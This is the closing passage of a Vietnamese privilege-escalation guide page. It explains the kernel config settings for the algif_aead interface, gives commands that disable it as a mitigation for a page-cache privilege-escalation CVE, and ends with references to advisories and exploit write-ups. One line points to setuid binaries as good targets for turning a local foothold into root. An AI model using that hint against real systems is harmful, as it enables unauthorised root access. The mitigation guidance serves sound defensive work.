Các giá trị cấu hình bên dưới phân biệt một giao diện có thể nạp với một giao diện được tích hợp vào kernel; các quy tắc build crypto ánh xạ `CONFIG_CRYPTO_USER_API_AEAD` sang `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` có thể được nạp/gỡ như một module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: giao diện được tích hợp vào kernel
- các binary setuid là mục tiêu tốt vì chỉ cần một bản vá chỉ áp dụng cho page cache cũng có thể biến foothold cục bộ thành quyền root

#### Giảm bề mặt tấn công cho đường đi `algif_aead`

Nếu giao diện dễ bị tấn công được cung cấp bởi một module có thể nạp:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Nếu nó được biên dịch vào kernel, một số báo cáo đã ghi nhận việc chặn đường dẫn init bằng:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Kiểu giảm thiểu này cũng đáng ghi nhớ đối với các LPE kernel khác: nếu việc khai thác phụ thuộc vào một giao diện tùy chọn cụ thể, việc tắt hoặc đưa giao diện đó vào blacklist có thể chặn đường khai thác ngay cả trước khi có thể nâng cấp toàn bộ kernel.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – chiếm quyền điều khiển script chạy với root trong thư mục PaperCut cho phép người dùng ghi](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — Câu hỏi thường gặp](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Thông báo tiết lộ CVE-2026-31431 trên Openwall oss-security](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Bản sửa lỗi Linux stable: crypto: algif_aead - Hoàn nguyên về hoạt động out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — thông báo bảo mật CVE-2026-31431](https://copy.fail/)
- [7] [Bài phân tích kỹ thuật của Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository / README của DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Phân tích và khai thác biến thể Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Bản sửa lỗi Linux: net: skb: giữ nguyên `SKBFL_SHARED_FRAG` trong `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Biện pháp giảm thiểu trước đó của Linux: đặt `SKBFL_SHARED_FRAG` cho các gói UDP được splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — trang hướng dẫn Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Tài liệu Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Liên kết ứng dụng MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Đặc tả Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Đặc tả Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Ngôn ngữ Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile crypto của Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Lỗ hổng page cache AF_ALG trong Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Tài liệu Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Tài liệu Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Tài liệu cấu hình Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Tài liệu systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Kỹ thuật phát hiện trên Linux: cơ chế persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
